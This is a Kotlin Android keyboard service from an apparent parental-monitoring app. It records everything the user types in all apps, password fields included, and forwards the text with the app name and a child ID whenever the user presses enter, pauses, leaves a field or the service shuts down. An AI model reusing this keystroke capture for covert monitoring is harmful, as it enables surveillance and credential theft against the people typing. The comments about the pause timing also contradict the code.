package com.kova.child

import android.content.Context
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.graphics.drawable.StateListDrawable
import android.inputmethodservice.InputMethodService
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.text.TextUtils
import android.util.Log
import android.util.TypedValue
import android.view.Gravity
import android.view.HapticFeedbackConstants
import android.view.KeyEvent
import android.view.View
import android.view.inputmethod.EditorInfo
import android.view.inputmethod.InputConnection
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.TextView

/**
 * MODULE 2 — KovaInputMethodService
 *
 * Custom Android Input Method Editor (IME).
 * When the KOVA keyboard is set as the active keyboard
 * it captures every keystroke the child types across ALL apps.
 *
 * Sends the text buffer to Flutter:
 *  - Every time the user presses send/enter
 *  - After 3 seconds of inactivity (typing pause)
 *
 * The keyboard renders a production-quality layout:
 *  - QWERTY alpha layer with auto-capitalize
 *  - Numbers/symbols layer (2 pages)
 *  - Haptic feedback on every key press
 *  - Rounded keys with Material-style colors
 *
 * Direction = "outgoing" for all captured text.
 */
class KovaInputMethodService : InputMethodService() {

    companion object {
        private const val TAG = "KovaInputMethodService"
        private const val FLUSH_DELAY_MS = 1000L    // 1-second pause for faster alerts
        private const val MIN_BUFFER_LEN = 1        // Ignore trivially short buffers
        private const val PREFS_NAME = "com.example.kova"

        // ── Color palette (Material Dark) ──
        private const val COLOR_BG        = "#1B1B1F"   // keyboard background
        private const val COLOR_KEY       = "#2D2D33"   // letter key
        private const val COLOR_KEY_PRESS = "#3D3D45"   // letter key pressed
        private const val COLOR_SPECIAL   = "#3A3A42"   // shift, backspace, ?123
        private const val COLOR_SPEC_PRESS= "#4A4A55"   // special key pressed
        private const val COLOR_SPACE     = "#2D2D33"   // space bar
        private const val COLOR_ENTER     = "#4A6CF7"   // enter/send key
        private const val COLOR_ENTER_PRESS="#3B5ADB"   // enter pressed
        private const val COLOR_TEXT      = "#E8E8ED"   // key label
        private const val COLOR_TEXT_DIM  = "#9898A0"   // secondary text

        private const val KEY_RADIUS_DP  = 8f
        private const val KEY_MARGIN_DP  = 3f
        private const val KEY_HEIGHT_DP  = 46f
        private const val ROW_PADDING_DP = 2f
    }

    // ── Buffer state ──
    private val buffer = StringBuilder()
    private var currentApp = ""
    private var currentConversationId = ""

    // ── Timer for auto-flush on pause ──
    private val handler = Handler(Looper.getMainLooper())
    private val flushRunnable = Runnable { flushBuffer("pause") }

    // ── Keyboard state ──
    private var isShifted = false
    private var isCapsLocked = false
    private var isNumbersLayer = false    // false = alpha, true = ?123
    private var isSymbolsPage2 = false    // second page in numbers/symbols
    private var autoCapitalizeNext = true // capitalize first letter

    // ── Root view (swapped between layers) ──
    private var rootView: FrameLayout? = null

    // ─────────────────────────────────────────────
    // Lifecycle
    // ─────────────────────────────────────────────

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "✅ KOVA InputMethodService created")
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(flushRunnable)
        flushBuffer("destroy")
        Log.d(TAG, "❌ KOVA InputMethodService destroyed")
    }

    // ─────────────────────────────────────────────
    // Keyboard UI
    // ─────────────────────────────────────────────

    override fun onCreateInputView(): View {
        rootView = FrameLayout(this).apply {
            setBackgroundColor(Color.parseColor(COLOR_BG))
        }
        showAlphaLayer()
        return rootView!!
    }

    // ── Alpha (QWERTY) Layer ──

    private fun showAlphaLayer() {
        isNumbersLayer = false
        isSymbolsPage2 = false

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor(COLOR_BG))
            setPadding(dpToPx(4f), dpToPx(ROW_PADDING_DP), dpToPx(4f), dpToPx(8f))
        }

        // Row 1: q-w-e-r-t-y-u-i-o-p
        layout.addView(buildCharRow("qwertyuiop"))

        // Row 2: a-s-d-f-g-h-j-k-l (with side padding for stagger)
        layout.addView(buildCharRow("asdfghjkl", sidePaddingDp = 18f))

        // Row 3: SHIFT + z-x-c-v-b-n-m + BACKSPACE
        val row3 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(0, dpToPx(ROW_PADDING_DP), 0, dpToPx(ROW_PADDING_DP))
        }
        row3.addView(buildSpecialKey(if (isCapsLocked) "⇪" else "⇧", 1.5f, COLOR_SPECIAL, COLOR_SPEC_PRESS) {
            toggleShift()
        })
        for (c in "zxcvbnm") {
            row3.addView(buildCharKey(c))
        }
        row3.addView(buildSpecialKey("⌫", 1.5f, COLOR_SPECIAL, COLOR_SPEC_PRESS) {
            handleBackspace()
        })
        layout.addView(row3)

        // Row 4: ?123 + COMMA + SPACE + PERIOD + ENTER
        layout.addView(buildBottomRow())

        rootView?.removeAllViews()
        rootView?.addView(layout)
    }

    // ── Numbers/Symbols Layer ──

    private fun showNumbersLayer() {
        isNumbersLayer = true

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor(COLOR_BG))
            setPadding(dpToPx(4f), dpToPx(ROW_PADDING_DP), dpToPx(4f), dpToPx(8f))
        }

        if (!isSymbolsPage2) {
            // Page 1: Numbers + common symbols
            layout.addView(buildCharRow("1234567890", isSymbol = true))
            layout.addView(buildCharRow("@#\$_&-+()", isSymbol = true))

            val row3 = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER
                setPadding(0, dpToPx(ROW_PADDING_DP), 0, dpToPx(ROW_PADDING_DP))
            }
            row3.addView(buildSpecialKey("=\\<", 1.5f, COLOR_SPECIAL, COLOR_SPEC_PRESS) {
                isSymbolsPage2 = true
                showNumbersLayer()
            })
            for (c in "*\"':;!?") {
                row3.addView(buildSymbolKey(c.toString()))
            }
            row3.addView(buildSpecialKey("⌫", 1.5f, COLOR_SPECIAL, COLOR_SPEC_PRESS) {
                handleBackspace()
            })
            layout.addView(row3)
        } else {
            // Page 2: More symbols
            layout.addView(buildCharRow("~`|•√π÷×¶", isSymbol = true))
            layout.addView(buildCharRow("£¥€¢^°={}",  isSymbol = true))

            val row3 = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER
                setPadding(0, dpToPx(ROW_PADDING_DP), 0, dpToPx(ROW_PADDING_DP))
            }
            row3.addView(buildSpecialKey("?123", 1.5f, COLOR_SPECIAL, COLOR_SPEC_PRESS) {
                isSymbolsPage2 = false
                showNumbersLayer()
            })
            for (c in "\\©®™℅[]") {
                row3.addView(buildSymbolKey(c.toString()))
            }
            row3.addView(buildSpecialKey("⌫", 1.5f, COLOR_SPECIAL, COLOR_SPEC_PRESS) {
                handleBackspace()
            })
            layout.addView(row3)
        }

        // Bottom row: ABC + COMMA + SPACE + PERIOD + ENTER
        val bottomRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(0, dpToPx(ROW_PADDING_DP), 0, dpToPx(ROW_PADDING_DP))
        }
        bottomRow.addView(buildSpecialKey("ABC", 1.5f, COLOR_SPECIAL, COLOR_SPEC_PRESS) {
            showAlphaLayer()
        })
        bottomRow.addView(buildSymbolKey(","))
        bottomRow.addView(buildSpecialKey("", 4f, COLOR_SPACE, COLOR_KEY_PRESS) {
            commitChar(' ')
        }) // space bar
        bottomRow.addView(buildSymbolKey("."))
        bottomRow.addView(buildSpecialKey("↵", 1.5f, COLOR_ENTER, COLOR_ENTER_PRESS) {
            handleEnter()
        })
        layout.addView(bottomRow)

        rootView?.removeAllViews()
        rootView?.addView(layout)
    }

    // ─────────────────────────────────────────────
    // Key builders
    // ─────────────────────────────────────────────

    private fun buildCharRow(chars: String, sidePaddingDp: Float = 0f, isSymbol: Boolean = false): View {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(dpToPx(sidePaddingDp), dpToPx(ROW_PADDING_DP), dpToPx(sidePaddingDp), dpToPx(ROW_PADDING_DP))
        }
        for (c in chars) {
            if (isSymbol) {
                row.addView(buildSymbolKey(c.toString()))
            } else {
                row.addView(buildCharKey(c))
            }
        }
        return row
    }

    private fun buildCharKey(c: Char): View {
        val displayChar = if (isShifted || isCapsLocked || autoCapitalizeNext) c.uppercaseChar() else c
        val key = createKeyView(displayChar.toString(), 1f, COLOR_KEY, COLOR_KEY_PRESS, textSizeSp = 20f)
        key.setOnClickListener {
            haptic(it)
            val ch = if (isShifted || isCapsLocked || autoCapitalizeNext) c.uppercaseChar() else c
            commitChar(ch)
            // Auto-shift off after one character (unless caps-locked)
            if (isShifted && !isCapsLocked) {
                isShifted = false
            }
            if (autoCapitalizeNext) {
                autoCapitalizeNext = false
            }
        }
        return key
    }

    private fun buildSymbolKey(symbol: String): View {
        val key = createKeyView(symbol, 1f, COLOR_KEY, COLOR_KEY_PRESS, textSizeSp = 18f)
        key.setOnClickListener {
            haptic(it)
            for (c in symbol) {
                commitChar(c)
            }
        }
        return key
    }

    private fun buildSpecialKey(
        label: String,
        weight: Float,
        bgColor: String,
        pressColor: String,
        action: () -> Unit
    ): View {
        val key = createKeyView(label, weight, bgColor, pressColor, textSizeSp = 15f)
        key.setOnClickListener {
            haptic(it)
            action()
        }
        return key
    }

    private fun buildBottomRow(): View {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(0, dpToPx(ROW_PADDING_DP), 0, dpToPx(ROW_PADDING_DP))
        }
        row.addView(buildSpecialKey("?123", 1.5f, COLOR_SPECIAL, COLOR_SPEC_PRESS) {
            showNumbersLayer()
        })
        row.addView(buildSymbolKey(","))
        row.addView(buildSpecialKey("", 4f, COLOR_SPACE, COLOR_KEY_PRESS) {
            commitChar(' ')
        }) // space bar
        row.addView(buildSymbolKey("."))
        row.addView(buildSpecialKey("↵", 1.5f, COLOR_ENTER, COLOR_ENTER_PRESS) {
            handleEnter()
        })
        return row
    }

    // ── Generic key view factory ──

    private fun createKeyView(
        label: String,
        weight: Float,
        bgColor: String,
        pressColor: String,
        textSizeSp: Float = 18f
    ): View {
        val tv = TextView(this).apply {
            text = label
            setTextColor(Color.parseColor(COLOR_TEXT))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, textSizeSp)
            typeface = Typeface.create("sans-serif-medium", Typeface.NORMAL)
            gravity = Gravity.CENTER
            includeFontPadding = false
            isAllCaps = false

            // Rounded background with press state
            background = createKeyBackground(bgColor, pressColor)

            val marginPx = dpToPx(KEY_MARGIN_DP)
            val heightPx = dpToPx(KEY_HEIGHT_DP)
            layoutParams = LinearLayout.LayoutParams(0, heightPx, weight).apply {
                setMargins(marginPx, marginPx, marginPx, marginPx)
            }

            isClickable = true
            isFocusable = true
        }
        return tv
    }

    private fun createKeyBackground(normalColor: String, pressedColor: String): StateListDrawable {
        val pressed = GradientDrawable().apply {
            setColor(Color.parseColor(pressedColor))
            cornerRadius = dpToPxF(KEY_RADIUS_DP)
        }
        val normal = GradientDrawable().apply {
            setColor(Color.parseColor(normalColor))
            cornerRadius = dpToPxF(KEY_RADIUS_DP)
        }
        return StateListDrawable().apply {
            addState(intArrayOf(android.R.attr.state_pressed), pressed)
            addState(intArrayOf(), normal)
        }
    }

    // ─────────────────────────────────────────────
    // Input handling
    // ─────────────────────────────────────────────

    private fun commitChar(c: Char) {
        currentConnection()?.commitText(c.toString(), 1)
        buffer.append(c)
        resetFlushTimer()

        // Auto-capitalize after sentence-ending punctuation
        if (c == '.' || c == '?' || c == '!') {
            autoCapitalizeNext = true
        }
    }

    private fun handleBackspace() {
        val ic = currentConnection() ?: return
        val selected = ic.getSelectedText(0)
        if (TextUtils.isEmpty(selected)) {
            ic.deleteSurroundingText(1, 0)
        } else {
            ic.commitText("", 1)
        }
        // Remove last char from buffer if possible
        if (buffer.isNotEmpty()) {
            buffer.deleteCharAt(buffer.length - 1)
        }
        resetFlushTimer()
    }

    private fun handleEnter() {
        val ic = currentConnection() ?: return
        val editorInfo = currentInputEditorInfo

        // Check if the editor has a specific action (Search, Send, Go, etc.)
        val imeAction = editorInfo?.imeOptions?.and(EditorInfo.IME_MASK_ACTION) ?: EditorInfo.IME_ACTION_UNSPECIFIED

        when (imeAction) {
            EditorInfo.IME_ACTION_SEARCH,
            EditorInfo.IME_ACTION_SEND,
            EditorInfo.IME_ACTION_GO,
            EditorInfo.IME_ACTION_DONE -> {
                ic.performEditorAction(imeAction)
            }
            else -> {
                // Default: insert a newline
                ic.commitText("\n", 1)
            }
        }

        flushBuffer("enter")
        autoCapitalizeNext = true
    }

    private fun toggleShift() {
        if (isShifted && !isCapsLocked) {
            // Second tap → caps lock
            isCapsLocked = true
            isShifted = true
        } else if (isCapsLocked) {
            // Third tap → back to lowercase
            isCapsLocked = false
            isShifted = false
        } else {
            // First tap → single shift
            isShifted = true
        }
        // Refresh alpha layer to update key labels
        showAlphaLayer()
    }

    private fun currentConnection(): InputConnection? = currentInputConnection

    // ─────────────────────────────────────────────
    // Haptic feedback
    // ─────────────────────────────────────────────

    private fun haptic(view: View) {
        try {
            view.performHapticFeedback(
                HapticFeedbackConstants.KEYBOARD_TAP,
                HapticFeedbackConstants.FLAG_IGNORE_GLOBAL_SETTING
            )
        } catch (e: Exception) {
            // Some MIUI/OEM devices throw resource errors for haptic constants
            // Silently ignore to avoid keyboard latency
        }
    }

    // ─────────────────────────────────────────────
    // Editor focus — track which app the child is in
    // ─────────────────────────────────────────────

    override fun onStartInput(attribute: EditorInfo?, restarting: Boolean) {
        super.onStartInput(attribute, restarting)
        // Detect the currently focused app
        currentApp = attribute?.packageName ?: ""
        currentConversationId = "${currentApp}_${attribute?.fieldId ?: 0}"
        autoCapitalizeNext = true   // capitalize at start of every new field
        Log.d(TAG, "📝 Input started in: $currentApp")
    }

    override fun onFinishInput() {
        super.onFinishInput()
        // User left the input field — flush any pending text
        flushBuffer("field_exit")
    }

    // ─────────────────────────────────────────────
    // Hardware key fallback (physical keyboards)
    // ─────────────────────────────────────────────

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (event == null) return super.onKeyDown(keyCode, event)

        when (keyCode) {
            KeyEvent.KEYCODE_ENTER -> {
                flushBuffer("enter")
                return super.onKeyDown(keyCode, event)
            }
            KeyEvent.KEYCODE_DEL -> {
                if (buffer.isNotEmpty()) buffer.deleteCharAt(buffer.length - 1)
                resetFlushTimer()
                return super.onKeyDown(keyCode, event)
            }
            else -> {
                val char = event.unicodeChar
                if (char != 0) {
                    buffer.append(char.toChar())
                    resetFlushTimer()
                }
                return super.onKeyDown(keyCode, event)
            }
        }
    }

    // ─────────────────────────────────────────────
    // Buffer management
    // ─────────────────────────────────────────────

    /**
     * Reset the 3-second auto-flush timer.
     * Called after each keystroke.
     */
    private fun resetFlushTimer() {
        handler.removeCallbacks(flushRunnable)
        handler.postDelayed(flushRunnable, FLUSH_DELAY_MS)
    }

    /**
     * Flush the buffer to Flutter.
     * Only sends if buffer length ≥ MIN_BUFFER_LEN.
     *
     * @param trigger Why the flush happened: "enter", "pause", "field_exit", "destroy"
     */
    private fun flushBuffer(trigger: String) {
        handler.removeCallbacks(flushRunnable)

        val text = buffer.toString().trim()
        if (text.length < MIN_BUFFER_LEN) {
            buffer.clear()
            return
        }

        Log.d(TAG, "📤 Flush [$trigger] app=$currentApp len=${text.length}")

        val payload = mapOf(
            "app"             to currentApp,
            "text"            to text,
            "direction"       to "outgoing",
            "source"          to "keyboard",
            "trigger"         to trigger,
            "conversationId"  to currentConversationId,
            "timestamp"       to System.currentTimeMillis(),
            "childId"         to getChildId(),
        )

        KovaChannelManager.send("keyboard", payload)
        buffer.clear()
    }

    private fun getChildId(): String {
        return try {
            val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            prefs.getString("child_id", "unknown") ?: "unknown"
        } catch (_: Exception) {
            "unknown"
        }
    }

    // ─────────────────────────────────────────────
    // Utility — dp conversion
    // ─────────────────────────────────────────────

    private fun dpToPx(dp: Float): Int =
        TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dp, resources.displayMetrics).toInt()

    private fun dpToPxF(dp: Float): Float =
        TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dp, resources.displayMetrics)
}
